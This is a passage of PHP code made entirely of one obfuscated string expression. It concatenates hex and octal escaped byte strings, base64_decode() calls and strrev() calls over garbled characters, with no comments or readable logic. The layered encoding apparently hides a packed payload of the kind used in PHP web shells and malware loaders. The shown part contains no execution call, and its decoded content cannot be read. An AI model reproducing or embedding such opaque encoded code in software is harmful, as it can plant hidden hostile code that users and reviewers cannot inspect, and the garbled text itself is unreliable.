52\324\135\255\322\355\367\56\135\223\170\351\367\167\114\170\143\353\337\357\255\175\371\305\23\166\30\145\311\113\373\307\75\326\76\372\212\47\227\176\267\363\320\366\273".base64_decode('2+zbZu6+9ePc0tP/fPwJ31z+8AML3zj51Hd7h33rOjg19b6Kna6SBTsm/nnatA==')."\x6b\xae\xbd\xee\x8\xf5\x4f\xa7\x4d\x49\x6f\x8b\x8d\xba\xed\xaa\xe7\xdd\xbd\x57\xc9\x87\x3d\x1a\x7b\x7e\xd7\xf1\x9b\xaf\x5c\x74\xe5\x81\x95\xb5\x7f\x59\xf5\xc4\xef\xc7\x95\xc7\xf7\xae".strrev('AÂt}¨F[	…nº.üYﬂ.ïõÁd~sm‡[M‘ˇÙ‘˙\\53ﬁÚ‚2õwÛx')."\xd2\x83\xe5\x7f\xd8\xfe\xb4\xf3\x95\x68\xbc\xf9\x89\x51\x2f\xad\x3f\xd4\xf6\xd2\xeb\xf6\xed\x6d\x1f\xbf\xde\xd9\x71\xd2\x3d\xc7\xd8\xaf\x6e\xfc\x79\xf6\xd7\x1b\x2e\x9c\xf1\x44\xf2\xa2".base64_decode('eeuOrZzh+sPvH7vwqJPWH/fBfYfNv7wj57xg1P2rHpk/vm7dU2e3picee8W89g==')."\46\307\244\33\173\237\374\175\317\111\177\235\336\227\332\366\117\367\364\117\17\335\272\342\205\266\163\67\164\356\324\52\265\163\116\176\357\330\362\217\216\362\34\27\375\313"."\103\137\214\363\276\174\375\226\257\367\155\377\346\256\243\143\343\226\224\55\173\154\374\201\367\56\10\254\230\270\245\61\171\354\336\257\177\267\145\373\342\341\363\233\142\307".base64_decode('vBdfUzKiw3b9wSO2Hbqy4vq+XcO0M+ZXPt5ww4pmt2PZusvU8nXnb+2vuT2X2Q==')."\175\344\67\273\26\377\161\377\53\215\37\45\217\237\72\332\375\342\230\252\331\157\135\367\367\346\257\73\156\211\114\131\365\335\267\147\137\164\370\322\327\66\166\364\274\272".base64_decode('sPe2LVNPWrJgxSkHBnueWXCt65birvCtn7/12X+u2fH88xcdffAxG1+8s2O18g==')."\xc9\xc7\x45\x45\x3f\x1f\x38\xeb\x6f\xc3\xcf\xb5\x1f\xbe\x4a\xd9\xd4\x7c\x69\xac\x72\x95\x14\xbb\x6e\x84\x7d\xde\x94\xef\xbf\x68\xba\xe5\xf9\x3f\x1e\xbd\xdf\x7f\xc7\xda\xc3\xdf\xbb\xe7".strrev('àí∆¿À˙Ø≤=¨ç6Ô˝ıg=¨ooAŒzﬁµGkœ†ˆµ8_ñì‰ÀxÆxÆüK™')."\x76\xdc\x51\x3b\xbf\x2e\x3e\x2b\xfd\x75\xd9\x8e\x97\x5b\x5e\x9c\x71\xe4\xf2\x57\xef\xd9\x73\x73\x78\xce\x82\x8b\x47\x3c\xf2\xc7\xaf\x5e\x7c\xfb\xfa\xaa\xfd\x1f\xbf\xa6\xcd\x79\xec\xc7"."\xaf\xaf\xfc\xe0\x8b\xc1\xc1\x9f\xaf\x7f\x7b\xfd\x63\xbf\x3c\xf1\xf4\xf\xfe\xeb\x7e\x7a\xf7\xfa\xb7\xff\xf0\xe3\xbb\xfb\xd7\x38\xa3\xb\x8c\xfd\xdf\xdf\xb8\xfc\x8f\x83\xc7\xfd\x32\xb8".base64_decode('7+bl/5y95fsvd+8L//L5j+d953j05zf2nHj9z9+9fb3+l2Hfbx/x8vd37CjWKg==')."\x2e\x9e\x11\x7f\xba\x7d\xd1\xf1\xd7\x7e\xb5\xed\xb3\x53\x9d\xe7\xdd\xfc\xda\xc3\x53\xbe\xfb\x4f\xdf\xfe\x86\xd\x7f\xb2\xbf\xd1\xd5\xf9\xf0\xee\x8f\xbe\xed\xee\xfe\x61\x69\xcf\xf0\x1f".base64_decode('hm/d+mJvRVXloz2/3DG8fmtlefyvuYoHTr+y//A5h934rz0dg9vKBm46+/Zpaw==')."\xe3\xef\x7e\x7b\xf4\x13\x1d\xef\xf4\x94\x1c\x78\xe1\xe3\x9b\xae\xda\x74\x60\x87\xf6\xe4\xd7\xcb\xae\xdf\x7e\xa5\xe7\xb2\x2f\xb7\xfd\xf3\xdc\x1d\xe3\x2a\x4e\xad\xbd\xe3\xa5\x4d\x97\x1c".strrev('Ë<k¶ﬁÙøgœÃ˛æ6„5˜DÇ·πü˜õËprµyzÏÓﬂˆˆΩ.ÔÔÜ„ræ>õ}')."\x97\x43\x4e\x4b\xdf\xf1\xf8\xf2\x93\xa8\x39\x7e\x6f\x7f\x77\x7b\x4f\x8e\xa8\xdc\x88\x49\x49\x57\x3c\x1b\x55\x93\x84\xbf\x27\xd6\xc6\xd3\xcb\x89\xed\xb\xf9\xe9\x8f\xc9\x5d\x5a\x86\x70"."\xfe\x93\x27\x91\x9c\x93\x27\x4f\xc3\x1f\x40\xbc\x89\x75\xe6\x54\x2a\xe\x47\xd4\xfe\x4\xb1\xb4\x8a\xf6\xb4\xc7\x3a\xe2\xe4\x2c\x72\x32\x2d\x9c\xd4\x3f\x95\x94\x33\x6d\x2a\x61\xea\xe5"."\x4c\x2e\x46\xad\xb9\x26\x4d\x23\xdc\x76\xc5\x74\x52\x4b\xc5\xc\xf2\xd1\x6b\x24\x53\xb1\xe\x22\x36\xcf\x98\x46\x8a\xcd\xa9\x9\x20\x2e\x74\x90\xb4\x53\x48\xda\x19\xb4\x27\x6a\x57\x34"."\xdd\xdb\x49\xe\x6f\xd2\xa9\x8e\x48\x57\x3f\x35\x6f\x48\xf5\x1b\xf1\x1e\x72\x1a\x5a\x4e\x9b\x92\xe8\x8f\xe8\x44\xcb\xd2\xde\x1d\xcd\xf4\xf7\x91\xf3\xb1\x64\x67\x97\x12\xeb\x26\x28\x9c".base64_decode('OpmkL59O+lAxmaAwoXXF+qkA0p4xook+og6LdEU7U9Qoe1oFaej0CtKPyWXkAA==')."\165\332\44\202\201\362\151\223\50\236\323\321\154\57\151\110\71\355\131\326\110\52\355\271\176\122\177\305\124\72\112\4\217\123\150\51\63\10\144\362\264\351\24\165\44\11"."\211\220\173\214\366\164\234\210\105\345\24\203\35\271\130\46\322\105\216\156\163\35\75\311\124\47\231\54\123\246\321\26\50\51\176\235\143\62\255\271\67\325\16\60\320\103"."\373\120\101\121\66\203\324\76\225\64\254\243\73\235\211\346\310\34\351\326\372\22\31\235\240\167\372\44\222\151\306\224\162\212\45\322\275\276\164\147\127\44\25\247\321\164".strrev('2i:…h∆ttÆ9uí”G"nŸS©0HNùøØ¢z≠S);ø∫{fiπ˝}]≤ë&').base64_decode('aUo5HZ4ZtJ/l5aTWrl45He0nHZ5SRtqU7u3pS1ILwElTCVanTSfFTKXDMokuhw==')."\x19\x53\x49\x67\xe5\x4c\x7f\xc2\xa0\x88\x89\xe4\x3a\x55\x85\xce\x9a\x9e\x78\x7f\xac\x8b\x2a\x1\x7b\xbb\x3b\xe5\x14\x3d\x6c\x48\xc7\x52\x3d\xc9\x4e\x92\x6c\xfa\xc\xd2\xfa\x44\x46\x8d".strrev('Jí$^êßÀSh”b2'."\n".'§œm*y©ÆæÈìvjÇrΩ£dwSî°dÍ…/´†'."\n".'‘j').base64_decode('j9zbSdORLvXpPfF2rZMiO92v6bRlU0nL1FRvhhlYxDQl09FNtDxab193rocElA==')."\56\71\325\107\17\244\46\227\117\242\23\220\124\337\331\53\367\347\332\11\346\51\341\350\215\351\375\235\135\4\57\323\350\100\116\57\237\114\273\105\40\132\274\127\217\321"."\123\362\216\114\44\246\367\222\300\24\332\363\170\264\247\203\131\12\246\342\135\21\103\47\263\35\254\230\236\376\10\41\36\323\31\311\302\277\255\51\322\342\152\71\332\111"."\125\317\272\41\33\71\335\222\200\135\327\110\73\122\162\232\231\126\324\23\232\32\25\355\170\305\4\235\212\102\155\113\251\315\52\77\273\327\163\310\12\236\300\325\224\2"."\xb5\x28\x34\x35\x57\x7b\x40\xcd\x95\x70\xe2\xf\x83\x41\x31\x67\x34\x6d\x8\xd1\x20\x64\x8a\xd\x1a\x5a\x96\xd9\x18\x60\xeb\x25\x7\x6c\x95\xc3\xdc\xcf\x32\x82\x49\x7c\x70\x2f\x1e\x8f".base64_decode('UbWyrvdoWYKOTi0WTWq5mKnUWMRUJoNSbY81Jj4EHJTDjy8FmAlBETRizPYE/g==')."\107\232\213\57\34\351\112\127\116\141\6\361\70\265\203\216\101\104\30\156\254\272\67\144\275\323\41\202\355\142\254\232\6\315\114\46\35\346\213\150\360\126\22\235\35\141"."\156\230\13\333\331\54\330\213\300\260\240\117\25\72\304\7\115\300\240\70\166\346\316\323\263\33\260\233\303\153\125\324\70\206\116\30\301\42\61\23\323\30\64\106\211\65"."\x46\xc\x59\x99\xa9\x3e\x18\x14\xbe\xd9\x58\x87\x94\x54\x6\x8e\x18\x69\x82\x13\xdf\x54\xe1\xe6\xb5\xe6\x61\x2d\xd4\x7\x1c\x51\x60\xb4\x60\x47\x38\x9e\x4a\xe0\x27\x39\x5e\x82\xba\x48"."\x29\x2e\x3\x40\xac\x52\x8a\x83\x6c\x12\x35\x48\x97\xc\x8d\x7e\x93\x51\x70\xc2\x51\x70\xa2\x46\xb\x23\x20\xc6\xe1\x9e\xf2\x48\xcb\x4c\x2c\x88\x61\xd6\x68\x86\x65\x83\x8e\x2d\xd7\x14"."\223\156\10\106\330\370\50\206\3\304\251\155\136\227\246\111\157\136\321\142\224\31\157\344\334\23\135\210\263\111\270\51\66\11\35\250\112\346\73\132\136\267\304\116\246\305"."\171\54\66\77\253\144\300\76\313\232\236\351\53\210\162\261\65\342\151\256\245\153\301\2\150\144\235\63\105\202\221\311\31\5\22\212\330\66\235\156\152\65\111\100\155\270".base64_decode('STI68+bdwEF2PhUEFTFilVViKrUQVVIoJSFS2MaemaZGk4qcNZ19zZqTSWTgJQ==')."\x58\x63\xe6\x1c\x72\x13\x8f\x9c\xee\x85\x85\x7a\xc9\x37\xbf\x33\x20\x42\x93\xd6\xf3\x34\x4a\x30\x1c\xee\x6a\xe1\xb6\x2a\x4c\x46\x72\xf0\x43\x52\x0\xf3\xc0\x5\x3d\x14\xdc\xcd\x8c\xc"."\244\140\256\275\135\321\215\112\164\17\106\232\50\201\266\114\163\114\6\37\150\121\114\161\114\3\237\10\21\344\130\252\55\315\353\305\137\271\64\374\16\344\322\160\14\52"."\205\126\305\111\257\34\74\255\74\221\307\53\261\61\4\63\102\37\172\110\2\232\67\54\307\311\365\37\157\132\204\360\311\32\6\44\54\114\366\114\62\132\325\256\240\267"."\46\334\344\242\166\342\162\46\343\324\143\235\272\23\332\167\251\335\212\117\215\70\341\275\72\210\121\107\204\132\45\0\324\203\146\310\21\55\153\320\161\316\101\163\177\322".base64_decode('9AbzFAB4srNZAUYaVB/TkXEhIR+kc7pwmzDAJxTMjtD6K1kNcfQzoItpZiuoJw==')."\145\172\140\251\203\176\253\151\205\115\305\234\56\232\131\53\174\145\103\173\334\60\330\151\351\226\3\46\161\70\246\222\244\76\157\165\330\355\15\10\150\315\344\254\150\25".base64_decode('73G7mrzhYNAvILlSIP3wzgw/+oYhfncGniqJVkYiKwDv2UKL5qBELOvAVK+pdw==').base64_decode('BZjV8hRHmaOcpwUVhqHxdhW9uBcMuQIF7lzju9hkEMj9a5Kh3t8i1fh9zQ2NQQ==')."\174\311\30\303\33\375\102\74\262\115\45\321\364\106\166\176\64\51\336\323\344\163\325\170\44\157\143\310\117\215\317\231\341\40\272\166\20\144\141\212\202\254\256\260\273\326"."\44\77\16\210\127\43\304\22\131\111\144\1\55\264\25\267\25\265\115\150\53\151\53\135\342\150\323\27\71\305\41\41\73\163\223\233\164\251\222\175\261\355\274\41\30\234"."\x47\x6e\xd4\xf8\x3\xae\x1a\x1f\xad\x1e\x2c\x24\xf2\xe9\xaf\xf1\xe2\x8f\xf\xd6\xde\xfd\xfe\x43\xab\x3e\xf8\xf3\x9d\x7b\x96\xad\x4\x5\xed\xbd\xe6\x4f\x7b\xaf\xbc\xff\xfd\x7\x57\x7e"."\x78\xde\xdf\xf7\xdc\xb9\xe2\x83\x47\x57\xed\x5d\x7b\xd7\xde\x15\xe7\x92\x36\x7f\x78\xd7\x3\xef\xff\xfd\xb1\xf\xd6\xde\xb2\xe7\xce\xab\xf6\xae\xdb\xf2\xc1\x35\xe7\xe3\x88\x8f\x6e\xbd"."\173\317\45\267\260\206\111\37\255\171\164\357\252\233\366\136\261\171\357\312\73\367\74\264\146\317\43\177\332\363\340\203\66\220\373\243\13\126\176\360\367\73\367\136\274\156"."\357\215\347\354\275\157\371\336\365\53\367\134\262\141\317\325\267\174\260\352\256\75\67\234\267\347\302\225\37\336\165\305\30\353\344\301\341\205\24\375\304\244\301\271\270\115"."\237\120\202\121\332\246\117\204\350\54\5\277\45\320\176\35\374\122\123\135\60\345\202\360\272\133\143\215\307\172\37\104\14\222\313\351\23\360\254\200\223\232\261\211\72\271"."\xdc\x4e\xc3\x61\x74\x5\xa8\x78\xc8\x56\xc\x90\x31\x17\x1a\x25\x34\xc6\xed\x9\xd6\x4\xbc\xd5\x1e\x62\x21\xcd\x6\x6a\x1c\x32\xbe\x25\x96\x11\x0\x1a\xc\xcc\x67\xdf\xec\x52\x54\x9e".base64_decode('SwGphE7gUsnUEdkR1ZK5VBo1ViqCVkpFNkggESsoFcEtEwCUKFhuJfCKMbLWLA==')."\156\55\266\225\331\312\113\45\342\157\0\347\40\376\5\244\42\142\263\313\362\231\52\261\105\114\241\162\133\131\251\124\224\351\54\42\355\342\170\5\255\17\343\224\272\44".base64_decode('20pIg8Xm8rSARulGVlYB0ZKiNgZi+cGvyWdA1MFz4HECKawwydXoNqfErgaaig==')."\45\71\35\3\61\30\277\342\60\27\227\112\21\142\167\136\40\22\145\63\41\243\312\204\214\222\211\204\66\64\325\261\361\306\246\342\22\276\163\204\233\45\353\164\240\10"."\24\15\25\204\342\321\242\151\65\320\15\60\70\70\75\370\140\61\235\112\37\57\11\220\40\26\101\107\20\302\331\40\26\210\103\76\40\212\60\313\207\373\231\322\333\51"."\x79\x23\xbe\x7\x1a\x5a\x59\x1f\xe8\x5c\x26\x43\xa0\x70\xf\x12\xf0\xf6\x94\x27\x54\x53\x8f\x67\x79\x50\x98\xe6\xb1\xc8\x38\xd3\x44\xe5\xe8\x94\x4c\x53\x84\x49\x19\x24\x1d\x5e\x2e\x90".base64_decode('IIxA6byNtf5AA741FKyp9zS4HIRw45mA00PGSqqSiiHlw6BiE/pRRRRlIVQrWA==')."\x57\x61\x3\xb0\x50\x18\xb\x99\x76\xd2\x18\x32\xfa\x12\xba\x4b\x2a\xa3\x2c\x55\xc5\xf8\x6a\x36\x29\x92\x39\x3c\xf1\x7\x42\x61\x80\x0\x42\x9e\x5\xaa\x5b\x2c\xec\x10\x82\x6d\x2f\xbc"."\374\322\115\31\376\270\34\5\122\71\365\74\20\241\176\121\100\341\260\314\32\177\143\255\227\136\220\162\107\114\161\356\200\27\136\7\46\325\162\331\217\333\175\200\100\246"."\x27\xc6\xbe\xf9\x55\x58\x18\xc1\x76\x74\x10\xe0\x1b\x3a\x8c\x11\xdc\xb3\xc0\x6a\x82\x8d\xec\x9b\xf3\xad\x20\x0\x6d\x2c\x39\x6d\x6d\x71\xb3\xef\x7a\x76\x77\x11\x46\xf8\x3\x42\xc0\x15"."\160\65\4\131\60\320\2\150\65\204\11\167\370\32\134\301\20\350\125\143\163\3\247\347\76\327\174\60\25\374\24\233\124\230\160\56\56\161\114\230\123\332\206\157\50\341"."\x4f\xfc\x73\x26\xd\xc1\x9b\x1d\x8b\x96\x96\xdb\xa4\xa9\x83\xa5\x24\xd\xbd\xd3\x13\x36\x12\x80\x39\xc\xf3\x5a\xe6\xf9\xc2\x3e\x7f\x1d\xe\x23\xb7\x31\x9e\x74\x8c\x8b\x16\xd2\x42\x9"."\360\310\41\316\43\353\164\143\142\163\135\2\63\124\302\327\36\245\106\177\213\213\373\40\21\42\60\204\334\266\224\270\147\22\347\342\205\155\75\155\16\300\5\350\113\370".base64_decode('xSN3tUT5ixrI3xJBn+R20b1yiY1sC+Gk1k59BwCqN0B4Avy7gH4ggkgyALE1kw==')."\244\67\220\360\325\247\160\333\100\333\370\66\273\3\337\366\202\134\111\233\215\67\51\354\131\0\66\322\140\320\164\125\55\214\274\152\220\322\101\147\311\27\136\232\70\60".base64_decode('i/wQeWoWQQEJzq5iY+qZN9AI/taFBjzgrw/8+EJg1FSWAKw7n3euZwD+wyNKGQ==')."\42\361\165\17\163\6\157\343\0\370\27\120\221\1\157\243\265\260\152\117\250\305\343\301\11\350\67\371\345\111\1\125\41\135\25\274\13\235\345\247\67\25\45\237\247\66".base64_decode('JMEwbUY4XIKQaV80sTQcdurNZNqw6+ElxWPLi8lG4QrWDDASa5oQ+XMBGaKbJw==')."\2\363\226\103\302\165\1\177\163\223\20\256\167\315\367\66\326\321\220\163\2\375\232\100\275\166\270\275\101\200\242\32\72\31\271\23\37\61\214\277\61\357\43\262\263\246"."\231\355\6\344\33\4\4\136\34\162\371\230\374\232\27\133\165\263\327\347\26\157\347\302\204\370\153\34\42\335\144\343\30\107\33\107\303\350\236\56\15\100\224\323\157\64".base64_decode('3WgA4YAGMAJoCKGLBpCzIBpAHaUBKHZ4GmkcEPaAoEYluHZun5yQu9lNs5mxiA==')."\x70\x61\x1c\x52\x62\x7\x56\x9a\x41\x67\x2\x40\x16\x93\x99\x1a\xd2\xa2\x4d\x44\x4a\x27\x41\xe8\xc7\xa6\x87\x92\x70\xe1\x15\xaa\x25\x5\x45\x91\x13\xa7\x0\xcc\x26\x4a\x3\x7e\xdb\x96"."\xcc\x41\xcc\xf0\x12\x3a\x65\xf1\x25\x4b\x23\xa4\x1a\x49\x53\xa5\xe4\x5e\x16\xa8\xd4\x8b\xee\xb5\x9\xd5\x92\xed\x9c\xeb\x8f\xb0\xc6\x37\xac\x9\x4a\x60\xac\x16\x26\x1a\x52\xae\x99\x31".strrev('Ø]∂Fÿ¨r'."\r".'*†JF”¸H„≥!N≥f≥∞™À76oÃø#nòπ¬a-"åEK').strrev('.\\Pf©í;~.∏0KC!\\õ#J„s!⁄m~aŒ˚ƒDq¢~Ω$îXIõÏ?').base64_decode('C9hUtUqoWoNQvF4JSwWB9JY0dtFktYIUwdyQkukCqf2mCgbClEFUNssxkg+WIg==')."\321\232\221\222\62\155\366\43\4\46\112\62\14\157\24\3\66\50\254\360\366\247\24\135\147\347\5\210\55\240\237\106\202\137\347\24\335\45\271\253\51\256\162\151\43\250"."\44\311\241\237\73\202\114\120\371\355\4\206\70\135\60\115\105\172\77\216\157\354\311\312\222\221\224\344\145\35\27\122\161\240\217\73\106\202\52\67\136\346\42\312\272\362"."\x4e\xf6\xab\x19\xab\x2\x2e\xad\x35\x29\xd9\x94\x8a\x74\x89\x2d\xdc\xca\x9c\xc5\xb\xb9\x91\x31\xbf\xf6\x6b\xc8\xcd\xa5\x41\xd\x4d\x6c\x64\xed\xe5\x34\x31\x75\x87\x87\x26\x8c\xc4\x18"."\x38\x66\x3a\xd\x86\x14\xe5\x15\xac\x7d\x11\x2d\x21\xc5\x66\x89\xd6\x7f\x8c\xa5\x71\x86\xa6\x35\xc8\xe9\xbe\x90\x36\x5f\x55\xc8\x34\x75\xfb\x5b\x1a\x7d\x7e\xea\xef\x85\x3a\x83\xc2\xa1"."\166\162\30\15\204\240\254\203\6\14\372\221\225\111\315\55\164\243\203\213\125\160\21\70\106\234\3\150\60\371\234\164\5\152\352\1\213\32\256\365\2\316\334\263\40\304"."\xb\xa8\x7\x59\x1\xd3\x2b\xc\x93\x0\x6d\xa0\x4e\x10\x0\xc5\x85\xa4\xcd\xa7\xb5\xb3\xc5\xb\x48\x17\x71\xfe\x61\x5a\xc0\x5e\x3f\xc9\xeb\x50\xa0\x95\x3c\xb6\x9d\x86\xb7\x1a\x58\x46"."\xec\xe6\xe2\xbf\x67\x6a\x16\xfc\x68\xd\xb1\x36\xb\xe6\xab\x21\x9\x59\x85\x59\x24\x66\xfc\xf7\xa\x3\xa\x67\xbe\x41\x36\x74\x29\xe1\xbf\x66\xe2\x1e\xdd\x50\x4d\x28\x93\x40\xb7\x2c"."\171\320\4\302\106\336\144\254\23\44\232\173\55\0\304\22\110\25\365\140\247\365\7\132\111\367\365\220\211\376\321\134\144\265\32\262\241\106\235\350\206\23\341\42\146\42"."\x15\xac\x1d\xa1\x8a\x70\x26\x4b\x1\x9\x64\x5f\xf4\x58\x8e\xf8\xd4\xe0\x5a\x7c\x17\xfe\x69\x4d\xc5\xec\xa0\xe1\xe4\xb8\x2d\xa6\x18\xcc\x97\x1\x5c\x65\x2e\x82\x7e\xd8\x66\xe1\x7e\x58"."\x8a\x11\xa8\x1e\xc1\xdd\x90\xdc\xad\xc0\x3b\x8\x94\x55\xcf\x3b\xc8\x24\x5d\xc9\xef\x1c\x73\x5e\x61\x3e\xe9\x9a\xeb\x77\x87\x83\xfe\xe6\x0\xd5\xec\xc1\x30\xba\x63\x16\xf0\xd4\xb4\x32"."\205\33\203\326\272\346\133\41\160\15\204\134\165\5\301\114\252\202\160\304\267\204\3\176\50\134\172\174\265\226\14\301\172\346\371\311\14\13\373\274\215\163\13\106\204\374"."\xe1\x6\x21\xb\x6\x7a\x43\x9e\x6\x2b\xcc\x5c\x42\xd0\x3\xd7\x2f\xf\x57\xfb\xfc\x35\x42\xb4\xd7\x9f\x8f\x9\xc0\x2c\x59\x80\x58\x46\xc5\x40\xc0\x6c\xb7\x2d\x45\x1c\x4a\x25\x60\x54"."\142\3\220\275\265\207\1\167\74\247\155\260\264\244\315\71\307\61\201\11\147\230\236\10\267\244\206\0\353\224\356\127\132\1\160\313\240\100\234\215\204\234\16\7\251\204"."\x7d\x0\xf1\x91\x39\xd0\xa0\x64\x94\xb8\xdb\xb\x62\x57\x3\xa6\x56\x58\xee\xfb\xd2\xab\x87\xe\xab\x77\x2a\x2f\xd6\xaf\x87\x83\xad\x41\x86\x6d\x3c\x15\xb\xc5\x9b\xe6\x17\x4e\x26\x9e"."\204\131\22\203\277\115\142\122\170\124\133\60\241\151\202\232\356\232\211\40\207\252\361\265\300\27\155\114\213\346\240\67\3\216\161\276\315\0\20\341\245\370\61\270\316\365"."\10\144\223\261\213\216\11\41\116\105\156\41\26\261\354\30\4\300\117\155\204\175\205\3\53\250\201\102\253\75\145\217\265\205\352\240\177\245\266\263\131\3\325\254\340\340"."\10\360\225\61\125\270\340\50\107\51\143\220\213\166\322\133\127\210\144\351\366\36\225\242\140\54\363\205\100\216\210\303\62\162\373\21\26\155\24\272\354\272\332\236\266\313"."\311\166\15\60\11\11\152\262\143\227\73\115\361\334\331\126\106\113\252\324\347\111\227\35\124\41\304\341\304\240\160\112\370\341\171\17\163\124\6\3\72\13\211\363\2\221"."\106\166\222\11\11\160\275\145\32\62\40\163\243\26\104\235\250\224\46\23\337\200\265\200\133\213\361\311\114\275\275\361\253\256\160\277\107\356\360\160\320\46\161\117\243\124"."\52\55\314\214\100\11\110\270\175\104\211\106\252\223\37\2\246\72\331\51\126\324\264\211\302\375\212\207\262\302\76\111\334\172\202\270\352\76\172\44\115\356\12\125\367\301".base64_decode('jS6PY4P3TkXPqK6W4GR7fYOrxg5IXwW1NwIbUFsI7EB0Lsk9+mTKF2PIxKlSAg==').base64_decode('IJ9Mknw/ZGPN/vcwELvRAvJaDJ71UY4HQy2TBwM5D4/D2D0LPUJPyKzBsBv4qw==')."\120\275\13\12\326\273\240\120\275\13\54\365\56\310\257\27\203\54\223\124\316\144\152\260\277\317\1\201\232\230\100\121\61\100\51\156\34\236\145\212\47\242\104\62\305\6"."\x4a\xe\x10\xed\xc6\xcc\x5f\x8c\xa5\xd7\xf9\x17\x5b\x8\x71\x61\x89\x98\x8a\x73\x10\xd2\x44\xb2\x3b\xe1\x99\xc\xfe\x4c\xca\xba\x1\x39\xe3\xff\xb\x6f\x79\xf0\x86\x7b\x3\x63\xd7\x19"."\x8f\xe5\xd4\x74\xdd\x9\x3d\x3\x21\xce\x92\x19\x1\xf8\x83\x54\x2b\x67\xee\x13\x3e\x7e\x15\xa4\x43\xe2\xb6\x84\x39\x6e\x63\x6e\xdd\xb8\xef\x37\xac\x4c\xc1\xdf\x1e\x76\x85\x1d\x30\xc8"."\xae\x76\x25\xa8\x40\xd2\x46\xb0\xe2\xe9\xcd\x68\xba\x22\xba\x21\x8c\x29\xc8\x53\x15\xbb\xaa\x28\xf8\xec\x4b\xc9\xbd\x90\xf8\x50\xdb\x8\xc1\x7b\x1f\x75\x6c\x27\xba\x9\x82\x8\xb3\xa7".base64_decode('TN5De+2g6xZvd7qidFJBSGCWmfDaxLzYWbujmpwHcIqYZd4PsdrdXhBgF64BYw==')."\272\40\170\303\4\55\44\225\300\6\223\225\234\100\130\242\242\57\376\71\273\120\377\355\131\356\162\20\214\52\366\123\73\127\351\243\316\373\54\153\301\342\357\257\255\256"."\255\241\55\44\42\314\310\312\361\70\150\266\340\102\314\324\226\137\363\110\110\64\112\343\13\372\40\44\221\210\27\166\146\221\315\200\255\47\314\346\51\162\121\135\140\246"."\xce\x83\x70\x32\x57\xe3\xdc\xd0\x20\x93\x13\x7c\xa5\x8b\xb3\x3\xee\xd3\xcc\x96\x0\x8a\xba\xd8\x11\x24\x25\x10\xc8\x41\x23\x71\xe8\xca\x3c\x26\x2\xf4\xa4\xab\xb5\x18\xd9\xf4\x96\x16"."\x81\x79\x57\x54\x59\x34\xb6\x4\xfc\x96\x16\xd9\x8a\x20\xcb\x84\xc2\x70\xa4\x20\x0\xb5\xa3\xa8\x72\x6c\x9\xfa\x28\x25\xf7\xe1\xfb\x89\xb1\xa6\xe0\x11\x8d\x1f\x66\x10\x21\x77\x8e\x6c".base64_decode('GILubQ7CBlzpFc4KZw9Z/XO6YI3cI7OV4veGAZGjuqiwSGoJESdYF2PqWUsoEQ==')."\156\160\223\342\27\330\135\15\147\333\271\217\302\131\163\172\123\111\211\310\77\125\305\345\216\262\142\211\72\364\256\52\156\16\325\332\247\27\317\231\75\162\126\15\122\312"."\33\112\3\324\252\103\377\217\130\54\235\115\124\147\263\340\142\142\1\247\71\64\124\136\34\57\247\344\176\55\15\66\66\100\217\122\216\50\101\146\63\243\131\334\155\144"."\132\61\172\264\54\71\161\40\344\264\242\154\262\70\157\311\24\241\366\265\370\232\176\45\324\232\321\356\67\147\372\162\151\73\24\216\355\101\321\127\216\305\115\155\231\71"."\x3d\x14\x6f\xcd\xe9\x45\x42\x18\xe5\x24\x22\xc5\x3f\xb1\x5b\xe1\x4a\x49\xf4\x35\x2d\x38\xe5\xb3\x43\xe\x0\xaf\x3c\xaa\x69\x21\x30\x48\x23\x29\x48\x35\xdb\xde\xc\x30\x2\x18\x36\x13"."\xc0\x33\x2d\xed\x85\xa8\xb6\x3\xae\xa\xce\x7f\xb0\xa8\xc0\x66\x6b\x28\x85\x92\x98\x1d\x1a\x5b\xdd\x1c\x5b\xb1\x80\xb2\xc0\xc1\xb5\x8b\xfe\x93\x7b\x1\x4b\xd\xa3\xa1\xe7\x55\x3b\x1c"."\x5f\x3b\xb5\xb5\xce\x8f\xe1\x8b\xba\x60\x53\xa3\x64\xaa\x14\x4a\xd2\x9c\x53\x63\xd6\x2a\xd1\x21\x8f\x3d\x97\xa3\x15\x16\x2c\x54\x64\xf8\x69\x2\xd4\x9\x2f\x2b\xcf\xc4\x7a\x3\x51\xdd".base64_decode('zrhtK/cuaDPzfZeCxStVTKqcMgP8wZDx9IwqlzGq2Cf1bTrGGad0gHs/pn2DAw==')."\156\162\350\52\200\71\32\331\12\247\4\304\224\216\267\326\344\73\233\164\24\113\222\202\33\133\244\166\305\53\11\36\332\206\231\133\340\2\224\64\246\20\153\174\65\115".strrev('–…HÑ´;•»ö3éÇ´m'."\n".'¶q™	ﬁëÌZIÔ\'dë"_2Ù≤»˝;H'."\r".'ç∂¡K6')."\64\51\45\247\373\10\273\77\116\257\34\247\317\204\25\125\215\163\114\216\353\40\200\43\270\167\67\270\217\160\57\111\330\315\2\211\301\112\146\7\364\271\355\200\233\124"."\x80\x5e\x7a\x6a\x4a\xe6\x98\xbf\xe5\xc\xfa\x26\x2d\x6c\xf2\x35\xd7\x79\x1b\x85\x73\x66\x1\x10\xae\x71\x37\x86\x5d\x4d\x4d\x5\x23\xc8\x48\x60\xd5\x15\x3c\x92\x71\x74\xd0\x27\x5\xa2"."\x74\x56\xcd\x52\x53\xed\x52\x14\x5a\x9d\x56\x15\x41\x68\x91\xa4\x67\xa3\xd4\xc7\x5d\x91\x93\xd0\x51\x94\x80\xb\x48\xb3\x54\x92\xa5\x18\x66\x91\xe2\x60\x9a\xd8\xd1\x17\x8e\x2e\x9e\x3d"."\313\251\316\146\310\346\36\44\262\32\67\252\165\70\317\200\342\222\23\36\341\246\307\303\321\25\217\221\20\264\226\373\213\220\244\131\262\204\361\130\125\14\317\327\342\305"."\122\2\354\307\314\110\145\266\65\163\43\75\265\230\345\224\305\110\270\262\2\32\145\166\231\310\324\315\324\307\5\365\342\256\250\305\121\162\215\234\236\237\237\5\26\356".base64_decode('iIpReCSR2W9+eicS9Z1cOjQ5cjKfGjBFe4EZ4mBPFGTkaCecXnwvIA0gEU1QOg==')."\301\21\46\137\277\206\160\152\6\372\0\52\205\322\151\226\273\60\137\272\24\27\4\267\377\301\301\174\30\261\273\261\106\271\62\252\25\4\247\221\25\6\5\154\16\3"."\233\232\271\32\74\205\305\104\34\102\323\370\32\353\170\6\54\175\360\60\210\134\110\115\332\120\250\155\141\261\143\302\340\240\123\245\7\325\155\105\346\274\16\226\32\207".base64_decode('2xzm9KDlBNUsIQFYU2Lm8Syy8kY6J3ALf3YgLcFT6qqq2QvZUcMiGkc5QLV8Og==')."\35\356\376\204\75\324\302\76\153\32\71\217\313\15\220\105\64\131\146\77\46\64\16\244\50\161\231\375\360\315\351\146